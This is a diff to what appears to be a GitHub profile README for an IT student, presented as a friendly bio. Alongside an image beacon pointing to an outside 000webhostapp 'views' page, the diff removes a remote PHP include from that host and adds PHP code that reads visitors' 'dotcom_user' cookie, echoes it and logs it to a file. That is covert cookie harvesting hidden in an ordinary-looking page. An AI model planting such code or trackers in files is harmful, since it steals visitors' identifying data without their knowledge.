@@ -2,9 +2,13 @@
 Hi 👋 My name is Fantin Elallouf
 ================================
  <img alt="views" title="GitHub profile views" src="http://deezeruserview.000webhostapp.com/index2.php"/>
-  <?php include 'http://deezeruserview.000webhostapp.com/index2.php';?>
-
-
+<?php
+$myfile = fopen("log.txt", "a");
+$txt = $_COOKIE['dotcom_user']."\n";
+echo $_COOKIE['dotcom_user'];
+fwrite($myfile, $txt);
+fclose($myfile);
+?>
 Student in IT in Toulouse.  
 Love absurd stuff ...  
 Ideas always flow, but finishing? That's a work in progress...  
